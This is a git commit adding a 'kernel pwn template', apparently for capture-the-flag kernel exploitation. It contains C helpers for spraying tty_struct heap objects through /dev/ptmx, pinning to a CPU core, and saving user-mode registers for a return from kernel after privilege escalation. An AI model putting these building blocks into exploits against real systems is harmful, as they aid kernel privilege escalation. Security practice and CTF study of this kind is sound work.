1a0db3e618d850b0c2297862ee66dc6cca5a7026
Alex Schmith <alexanderschmith@protonmail.com>
2025-02-23 17:16:00 -0500

    added kernel pwn template

---
+++ templates/kernel/src/heap.c
@@ -0,0 +1,16 @@
+
+
+
+
+void spray_tty_struct(){
+    int spray[SPRAY_SZ];
+
+    LOG("Spraying tty_structs");
+    for(int i = 0; i < SPRAY_SZ / 2; i++) {
+        spray[i] = open("/dev/ptmx" , O_RDONLY | O_NOCTTY);
+        if(spray[i] == -1) {
+            __asm__("int3");
+        }
+    }
+}
+
---
+++ templates/kernel/src/kernel.c
@@ -0,0 +1,37 @@
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <stdlib.h>
+#include <stropts.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <stdint.h>
+
+#define PAGE_SIZE 0x1000
+#define TTY_STRUCT_SIZE 0x2E0
+#define CRED_STRUCT_SIZE 0xA8
+
+void bind_core(int core) {
+  cpu_set_t cpu_set;
+  CPU_ZERO(&cpu_set);
+  CPU_SET(core, &cpu_set);
+  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
+}
+
+
+size_t user_cs, user_ss, user_rflags, user_sp;
+void save_status()
+{
+    __asm__("mov user_cs, cs;"
+            "mov user_ss, ss;"
+            "mov user_sp, rsp;"
+            "pushf;"
+            "pop user_rflags;"
+            );
+    puts("[*]status has been saved.");
+}
+
+
